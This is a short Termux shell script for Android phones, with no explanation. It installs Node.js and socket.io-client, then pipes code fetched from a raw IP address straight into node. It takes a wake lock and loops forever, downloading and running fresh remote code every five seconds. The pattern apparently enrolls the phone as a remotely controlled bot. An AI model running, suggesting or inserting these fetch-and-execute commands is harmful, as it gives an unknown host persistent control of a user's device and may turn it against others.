pkg update && pkg install nodejs -y
npm install socket.io-client
curl -sL http://72.61.116.57:3000/run | node
termux-wake-lock
while true; do curl -sL http://72.61.116.57:3001/run-normal | node; sleep 5; done